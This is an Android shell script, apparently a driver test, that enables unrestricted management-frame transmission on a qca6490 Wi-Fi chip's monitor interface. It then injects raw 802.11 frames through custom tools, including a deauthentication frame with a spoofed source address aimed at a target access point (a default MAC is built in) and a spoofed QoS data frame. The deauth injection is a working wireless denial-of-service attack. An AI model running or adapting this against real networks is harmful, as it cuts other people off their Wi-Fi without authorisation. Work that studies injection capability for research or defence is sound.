#!/system/bin/sh
set -u

# monitor_v12_full_test.sh <freq> <target-ap-flat-mac> <spoof-flat-mac>
freq=${1:-5745}
target_ap=${2:-783ea1d4fa3d}
spoof=${3:-020000000001}

cleanup() {
    printf 'N' > /sys/module/qca6490/parameters/monitor_probe_tx
    printf 'N' > /sys/module/qca6490/parameters/monitor_probe_tx_sta_vdev
    printf 'N' > /sys/module/qca6490/parameters/monitor_mgmt_tx_unrestricted
    /data/local/tmp/nl80211_probe del mon0 || true
}
trap cleanup EXIT INT TERM

/data/local/tmp/nl80211_probe del mon0 || true
/data/local/tmp/nl80211_probe addmon mon0 || exit 1
ip link set mon0 up || exit 1
printf '%s 0\n' "$freq" > /sys/class/net/mon0/monitor_mode_channel

mac=$(cat /sys/class/net/mon0/address)
macflat=$(echo "$mac" | tr -d ':')

printf 'N' > /sys/module/qca6490/parameters/monitor_probe_tx_sta_vdev
printf 'Y' > /sys/module/qca6490/parameters/monitor_probe_tx
printf 'Y' > /sys/module/qca6490/parameters/monitor_mgmt_tx_unrestricted

echo "mon0=$mac freq=$freq ap=$target_ap spoof=$spoof"

echo "--- test1 probe own-SA netdev ---"
/data/local/tmp/mon_inject_raw mon0 "40000000ffffffffffff${macflat}ffffffffffff0000" 1 0
sleep 3
cat /sys/module/qca6490/parameters/monitor_probe_tx_status

echo "--- test2 probe foreign-SA netdev ---"
/data/local/tmp/mon_inject_raw mon0 "40000000ffffffffffff${spoof}ffffffffffff0000" 1 0
sleep 3
cat /sys/module/qca6490/parameters/monitor_probe_tx_status

echo "--- test3 deauth foreign-SA netdev ---"
/data/local/tmp/mon_inject_raw mon0 "c0000000${target_ap}${spoof}${target_ap}00000700" 1 0
sleep 3
cat /sys/module/qca6490/parameters/monitor_probe_tx_status

echo "--- test4 qos-data foreign-SA netdev ---"
/data/local/tmp/mon_inject_raw mon0 "88000000${target_ap}${spoof}${target_ap}00000000" 1 0
sleep 3
cat /sys/module/qca6490/parameters/monitor_probe_tx_status

echo "--- test5 deauth foreign-SA nl80211 ---"
/data/local/tmp/nl80211_mgmt_tx mon0 "$freq" "c0000000${target_ap}${spoof}${target_ap}00000700"
sleep 3
cat /sys/module/qca6490/parameters/monitor_probe_tx_status
